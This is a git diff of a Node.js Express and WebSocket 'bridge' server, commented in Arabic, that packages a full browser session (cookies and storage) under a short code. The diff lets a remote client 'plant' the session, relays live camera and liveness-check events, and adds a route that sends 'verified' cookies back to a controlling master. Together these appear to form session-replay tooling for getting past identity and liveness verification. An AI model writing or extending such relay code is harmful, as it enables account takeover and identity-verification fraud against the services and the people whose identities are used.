@@ -4,9 +4,12 @@ const WebSocket = require('ws');
 const cors = require('cors');
 
 const app = express();
+
 // السماح بطلبات من جميع النطاقات (CORS)
 app.use(cors());
-app.use(express.json());
+
+// 🔥 مهم جداً: زيادة الحد الأقصى لحجم البيانات لأن الجلسة الكاملة (Storage + Cookies) قد تكون كبيرة
+app.use(express.json({ limit: '50mb' }));
 
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -17,7 +20,7 @@ const activeMasters = new Map();
 const shortSessions = new Map();
 
 // ==========================================
-// 1. قسم الماستر (WebSocket) لتتبع الخطوات
+// 1. قسم الماستر (WebSocket) لتتبع الخطوات والتوجيه العكسي
 // ==========================================
 wss.on('connection', (ws) => {
     ws.on('message', (message) => {
@@ -41,37 +44,25 @@ wss.on('connection', (ws) => {
 });
 
 // ==========================================
-// 2. نظام الروابط القصيرة وحفظ البيانات
+// 2. نظام الروابط القصيرة وتناقل الجلسة
 // ==========================================
 
-// أ: مسار لإنشاء كود قصير وحفظ بيانات العميل (يستدعيه الماستر)
+// أ: مسار لإنشاء كود قصير وحفظ الجلسة الكاملة القادمة من الماستر
 app.post('/create-short-link', (req, res) => {
     const { sessionData } = req.body;
+    
     if (!sessionData) {
         return res.status(400).json({ error: "No session data provided" });
     }
-
-    // 🔥 استخراج الروابط وبيانات البروكسي لحفظها في الجلسة
-    const newSession = {
-        user_id: sessionData.user_id,
-        transaction_id: sessionData.transaction_id,
-        ip_address: sessionData.ip_address,
-        plugin_liveness_url: sessionData.plugin_liveness_url,
-        challenge_url: sessionData.challenge_url,
-        check_id: sessionData.check_id,
-        config_url: sessionData.config_url || null, 
-        init_url: sessionData.init_url || null,
-        proxy: sessionData.proxy || null // 🔴 تمت إضافة حقل البروكسي هنا
-    };
 
     // توليد كود عشوائي من 6 أحرف وأرقام
     const shortCode = Math.random().toString(36).substring(2, 8).toUpperCase();
     
     // حفظ البيانات في السيرفر وربطها بالكود
-    shortSessions.set(shortCode, newSession);
-    console.log(`[SESSION CREATED] Short Code: ${shortCode} | Proxy Attached: ${!!newSession.proxy}`);
+    shortSessions.set(shortCode, sessionData);
+    console.log(`[SESSION PACKAGED] Short Code: ${shortCode} | Proxy Included: ${!!sessionData.proxy}`);
 
-    // تنظيف الذاكرة: حذف الجلسة تلقائياً بعد 15 دقيقة
+    // تنظيف الذاكرة: حذف الجلسة تلقائياً بعد 15 دقيقة لتفادي استهلاك الذاكرة
     setTimeout(() => {
         shortSessions.delete(shortCode);
         console.log(`[SESSION EXPIRED] Short Code deleted: ${shortCode}`);
@@ -80,7 +71,7 @@ app.post('/create-short-link', (req, res) => {
     res.json({ success: true, shortCode: shortCode });
 });
 
-// ب: مسار لجلب البيانات باستخدام الكود القصير (يستدعيه العميل)
+// ب: مسار لجلب البيانات باستخدام الكود القصير (يستدعيه العميل لزرع الجلسة)
 app.get('/get-session-data/:code', (req, res) => {
     const code = req.params.code;
     const data = shortSessions.get(code);
@@ -93,8 +84,29 @@ app.get('/get-session-data/:code', (req, res) => {
 });
 
 // ==========================================
-// 3. قسم العميل (HTTP POST) لإرسال النتائج
+// 3. قسم العميل (HTTP POST) لإرسال النتائج العكسية و التتبع
 // ==========================================
+
+// أ: مسار الترحيل العكسي - إرسال الكوكيز الناجحة للماستر
+app.post('/return-session', (req, res) => {
+    const { session_id, final_session } = req.body;
+    
+    const masterWs = activeMasters.get(session_id);
+    if (masterWs && masterWs.readyState === WebSocket.OPEN) {
+        // إرسال الكوكيز الجديدة التي تثبت النجاح إلى الماستر
+        masterWs.send(JSON.stringify({ 
+            type: 'SESSION_RETURNED', 
+            final_session: final_session 
+        }));
+        console.log(`[SUCCESS] Verified Session returned to Master for ID: ${session_id}`);
+    } else {
+        console.warn(`[WARNING] Master disconnected. Could not return session for ID: ${session_id}`);
+    }
+    
+    res.json({ success: true });
+});
+
+// ب: مسار نقل التتبع اللحظي (مثل: الكاميرا اشتغلت)
 app.post('/', (req, res) => {
     const { session_id, type, payload, reason } = req.body;
 
@@ -102,25 +114,19 @@ app.post('/', (req, res) => {
         return res.status(400).json({ success: false, error: 'Missing session_id' });
     }
 
-    // البحث عن الماستر المرتبط بهذه الجلسة
     const masterWs = activeMasters.get(session_id);
     const isMasterConnected = masterWs && masterWs.readyState === WebSocket.OPEN;
 
-    // الحالة أ: العميل أرسل النتيجة النهائية المشفرة (UUID)
+    // تم الإبقاء عليه احتياطياً لتوافق الأكواد السابقة إن وجدت
     if (payload) {
         try {
-            // فك التشفير (Base64) واستخراج الـ UUID
             const decodedStr = Buffer.from(payload, 'base64').toString('utf-8');
             const parsedPayload = JSON.parse(decodedStr);
             const uuid = parsedPayload.result;
 
             if (isMasterConnected) {
-                masterWs.send(JSON.stringify({
-                    type: 'UUID_RECEIVED',
-                    uuid: uuid
-                }));
+                masterWs.send(JSON.stringify({ type: 'UUID_RECEIVED', uuid: uuid }));
             }
-            console.log(`[SUCCESS] UUID received and forwarded for session: ${session_id}`);
             return res.json({ success: true }); 
         } catch (err) {
             console.error('Payload decoding error:', err);
@@ -128,7 +134,7 @@ app.post('/', (req, res) => {
         }
     }
 
-    // الحالة ب: العميل يرسل خطوات التتبع (تفعيل الكاميرا، أخطاء، الخ...)
+    // إرسال خطوات التتبع (تفعيل الكاميرا، أخطاء، الخ...)
     if (type) {
         if (isMasterConnected) {
             masterWs.send(JSON.stringify({
@@ -148,8 +154,8 @@ app.post('/', (req, res) => {
 app.get('/', (req, res) => {
     res.send(`
         <div style="font-family: monospace; padding: 50px; text-align: center; background: #000; color: #00ff9d; height: 100vh;">
-            <h1>SAMURAI BRIDGE SERVER IS ONLINE 🚀</h1>
-            <p>System is running securely...</p>
+            <h1>SAMURAI NUCLEAR BRIDGE SERVER IS ONLINE 🚀</h1>
+            <p>Full Session Replay Architecture is running securely...</p>
         </div>
     `);
 });
@@ -159,5 +165,5 @@ app.get('/', (req, res) => {
 // ==========================================
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, () => {
-    console.log(`[SERVER] Samurai Bridge listening on port ${PORT}`);
+    console.log(`[SERVER] Samurai Nuclear Bridge listening on port ${PORT}`);
 });
